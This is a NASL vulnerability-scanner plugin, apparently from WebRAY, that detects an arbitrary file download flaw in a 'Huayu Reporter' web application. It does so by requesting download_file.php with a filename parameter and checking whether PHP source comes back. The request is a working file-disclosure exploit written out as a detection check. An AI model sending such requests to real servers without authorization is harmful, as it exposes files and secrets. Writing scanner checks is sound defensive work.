############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799359);
  script_version("1.3");
  script_name(english:"huayu_report_filedown");
  script_summary(english:"huayu_report_filedown");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"huayu_report_filedown");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www",9091);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	res = http_send_recv3(method: "GET", port: port, item: "/", add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
	if("Login @ Reporter" >< res[2] || "dkey_activex_download.php" >< res[2]){

		url = "/view/action/download_file.php?filename=download_file.php&savename=data.txt";
		req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));

		if("200 O">< req[0] && '$_REQUEST["filename"];' >< req[2] && "fpassthru($file);" >< req[2] && "<?php" >< req[2]){
			security_hole(port:port, extra:req[2]);
		}
	}
}

function check_vuln_ssl(port){
	pre_res = http_get(item:"/", port:port);
	pre_ssl_req = https_req_get(port:port, request:pre_res);
	if("Login @ Reporter" >< pre_ssl_req || "dkey_activex_download.php" >< pre_ssl_req){
	
		url = "/view/action/download_file.php?filename=download_file.php&savename=data.txt";
		res = http_get(item:url, port:port);
		ssl_req = https_req_get(port:port, request:res);
	       	
		if("200 O"><ssl_req && '$_REQUEST["filename"];' >< ssl_req && "fpassthru($file);" >< ssl_req && "<?php" >< ssl_req){
			security_hole(port:port, extra:res);
		}
	}
}
##################################
ports = get_kb_list("Services/www");
foreach port (ports) {
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
